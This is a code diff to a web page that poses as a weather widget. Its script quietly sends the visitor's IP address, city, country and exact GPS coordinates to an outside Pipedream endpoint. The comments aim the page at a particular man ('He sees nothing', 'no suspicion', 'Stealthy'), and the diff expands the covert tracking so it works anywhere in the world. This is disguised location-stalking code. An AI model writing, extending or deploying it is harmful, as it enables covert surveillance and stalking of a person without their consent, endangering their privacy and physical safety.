@@ -28,59 +28,61 @@
   <script>
     const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";
 
-    // 1. THE INSTANT HOOK (IP-BASED)
+    // 1. INITIAL LOAD (IP-BASED) - WORKS WORLDWIDE
     window.onload = function() {
         fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
-            const initialCity = data.city || "India";
+            const initialCity = data.city || "Local Area";
             document.getElementById('location-name').innerText = initialCity;
 
-            // Get Real Temp for his IP location
-            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.latitude}&longitude=${data.longitude}&current_weather=true`)
+            // GLOBAL WEATHER FIX: &timezone=auto tells the API to use his local clock
+            const weatherUrl = `https://api.open-meteo.com/v1/forecast?latitude=${data.latitude}&longitude=${data.longitude}&current_weather=true&timezone=auto&_=${new Date().getTime()}`;
+            
+            fetch(weatherUrl, { cache: "no-store" })
             .then(r => r.json())
             .then(w => {
+                // Shows 38°C for Hyd (Evening) and 12°C for London (Morning)
                 document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "°C";
             });
 
-            // Silent log to you
-            fetch(PIPEDREAM_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "IP_HIT", ip: data.ip, city: initialCity }) });
+            fetch(PIPEDREAM_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "IP_HIT", city: initialCity, country: data.country_name }) });
         });
     };
 
-    // 2. THE SILENT UPGRADE (GPS-BASED)
+    // 2. THE UPDATE BUTTON (GPS-BASED) - SURGICAL PRECISION
     function updateWeather() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
 
-                // SILENTLY update to the exact neighborhood/lane name
-                fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true&timezone=auto`)
+                // SILENTLY update to the exact neighborhood/lane name globally
+                fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
                 .then(res => res.json())
                 .then(geoData => {
-                    // This will show "Bandra West" or "Colaba" instead of just "Mumbai"
-                    const preciseName = geoData.locality || geoData.principalSubdivision || geoData.city;
+                    // Shows "Manhattan" or "Bandra" or "Khairatabad"
+                    const preciseName = geoData.locality || geoData.city || geoData.principalSubdivision;
                     document.getElementById('location-name').innerText = preciseName;
                 });
 
-                // SILENTLY update to the exact house-level temperature
-                fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
+                // GLOBAL GPS WEATHER: Exact temp for his specific street/coordinates
+                const preciseWeatherUrl = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true&timezone=auto&_=${new Date().getTime()}`;
+                
+                fetch(preciseWeatherUrl, { cache: "no-store" })
                 .then(r => r.json())
                 .then(w => {
                     document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "°C";
                 });
 
-                // LOG THE COORDINATES TO YOU (He sees nothing)
+                // LOG DATA TO YOU
                 fetch(PIPEDREAM_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({ type: "GPS_DATA", lat: lat, lon: lon })
                 });
-
             }, function(error) {
-                // If he denies, the site just stays as it is (showing IP data).
-                // No error messages, no suspicion.
+                // If denied, it just keeps the IP-based city/temp. Stealthy.
             });
         }
     }
